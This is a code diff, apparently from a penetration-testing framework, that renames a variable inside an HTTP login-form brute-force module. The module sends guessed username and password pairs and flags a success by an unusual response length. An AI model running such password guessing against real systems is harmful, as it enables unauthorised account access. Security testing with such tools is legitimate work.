@@ -125,15 +125,15 @@ class Exploit(exploits.Exploit):
 
             postdata = self.data.replace("{{USER}}", user).replace("{{PASS}}", password)
             r = requests.post(url, headers=headers, data=postdata, verify=False)
-            l = len(r.text)
+            length = len(r.text)
 
             if i == 0:
-                self.invalid = {"min": l, "max": l}
+                self.invalid = {"min": length, "max": length}
 
-            if l < self.invalid["min"]:
-                self.invalid["min"] = l
-            elif l > self.invalid["max"]:
-                self.invalid["max"] = l
+            if length < self.invalid["min"]:
+                self.invalid["min"] = length
+            elif length > self.invalid["max"]:
+                self.invalid["max"] = length
 
     def detect_form(self):
         url = sanitize_url("{}:{}{}".format(self.target, self.port, self.get_form_path()))
@@ -202,9 +202,9 @@ class Exploit(exploits.Exploit):
 
                 postdata = self.data.replace("{{USER}}", user).replace("{{PASS}}", password)
                 r = requests.post(url, headers=headers, data=postdata, verify=False)
-                l = len(r.text)
+                length = len(r.text)
 
-                if l < self.invalid["min"] or l > self.invalid["max"]:
+                if length < self.invalid["min"] or length > self.invalid["max"]:
                     if boolify(self.stop_on_success):
                         running.clear()
 
